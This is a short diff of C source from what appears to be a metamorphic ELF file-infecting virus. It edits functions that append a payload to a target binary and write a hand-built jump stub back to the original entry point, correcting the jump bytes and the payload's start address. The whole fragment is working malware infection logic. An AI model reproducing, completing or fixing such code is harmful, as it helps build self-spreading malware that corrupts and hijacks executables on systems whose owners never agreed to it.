@@ -63,12 +63,12 @@ int FORCE_INLINE metamorph_section(t_data data)
 
 void FORCE_INLINE write_jump(t_data data)
 {
-	char	jmp_code[] = "\xc9\xe9\xde\xad\xbe\xef"; // leaveq and jump
+	char	jmp_code[] = "\xe9\xde\xad\xbe\xef"; // leaveq and jump
 	int	jmp_addr;
 
 	jmp_addr = data.bin.old_entry - (data.bin.new_entry + data.infos.pl_size);
 	jmp_addr -= 5;
-	ft_memcpy(jmp_code + 2, (char *)&jmp_addr, sizeof(int));
+	ft_memcpy(jmp_code + 1, (char *)&jmp_addr, sizeof(int));
 	//LSEEK(data.fd, -2, SEEK_CUR);
 	WRITE(data.fd, jmp_code, sizeof(jmp_code) - 1);
 }
@@ -90,7 +90,7 @@ int inject(t_data data)
 	offset = LSEEK(data.fd, 0, SEEK_END);
 	WRITE(data.fd, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
 	/* write to file */
-	payload_addr = get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload);
+	payload_addr = get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload_start);
 	WRITE(data.fd, payload_addr, data.infos.pl_size);
 	write_jump(data);
 	CLOSE(data.fd);
